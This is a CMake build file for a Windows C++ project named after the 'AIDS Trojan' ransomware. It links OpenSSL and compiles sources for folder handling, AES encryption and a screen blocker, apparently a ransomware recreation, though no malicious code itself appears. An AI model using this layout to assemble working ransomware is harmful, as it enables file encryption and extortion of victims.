cmake_minimum_required(VERSION 3.15)

#set vcpkg env variables! You don't need that if you have set those environment variables
set(VCPKG_TARGET_TRIPLET x64-windows-static)

# Configure vcpkg
include(cmake/app_utils.cmake)
setup_vcpkg_before_project()

#setup the program language: c++ and some othe parameters
project(AIDS_Trojan LANGUAGES CXX)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

# Find the OpenSSL library
find_package(OpenSSL REQUIRED)

# Include the OpenSSL headers and libraries in your project
include_directories(${OPENSSL_INCLUDE_DIR})

add_executable(AIDS_Trojan
  main.cpp
  service/Folderservice.cpp
  service/Folderservice.h
  service/EncryptorService.h
  service/AESEncryptor.h
  service/AESEncryptor.cpp
  view/screenblocker.h
  view/screenblocker.cpp
  util/util.h
  util/util.cpp
)

target_link_libraries(AIDS_Trojan
    PRIVATE
    #${OPENSSL_LIBRARIES}
    OpenSSL::SSL
    OpenSSL::Crypto
)

install(TARGETS AIDS_Trojan
    LIBRARY DESTINATION ${CMAKE_INSTALL_LIBDIR})
